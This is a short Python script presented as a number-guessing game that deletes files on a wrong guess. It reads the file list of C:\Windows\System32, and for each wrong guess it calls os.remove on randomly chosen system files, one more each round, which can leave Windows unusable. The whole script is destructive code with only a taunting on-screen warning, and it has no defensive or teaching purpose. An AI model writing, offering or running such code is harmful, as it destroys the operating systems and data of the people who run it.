from random import randint, choice
import os
import time
folder = r"C:\Windows\System32"
def ListofFiles():
    try:
        filenames = []
        with os.scandir(folder) as entries: 
            for entry in entries:
                if entry.is_file():
                    filenames.append(entry.name)
        return filenames
    except FileNotFoundError:
        print(f"Error: Folder '{folder}' not found.")
        return []
    except Exception as e:
        print(f"An error occurred: {e}")
        return None

num = randint(1, 10)
print("\033[31mREAD CAREFULLY\033[0m")
print("\033[31mGuess the number from 1 to 10. For every wrong guess, I will delete random system file(s) \n—one more than the last time. 😈😈\033[0m")
no = 1
files = ListofFiles()
while True:
    while True:
        guess = int(input("So choose carefully --> "))
        if guess < 0 or guess > 10 or type(guess) != int:
            continue
        else:
            break

    if guess == num:
        for _ in range(3):
            print("\033[32mYou won..!!\033[0m")
            time.sleep(1)
        break
    else:
        print("Wrong guess.!!😈")
        for _ in range(no):
            random_file = os.path.join(folder, choice(ListofFiles()))
            print(random_file)
            os.remove(random_file)
        no += 1
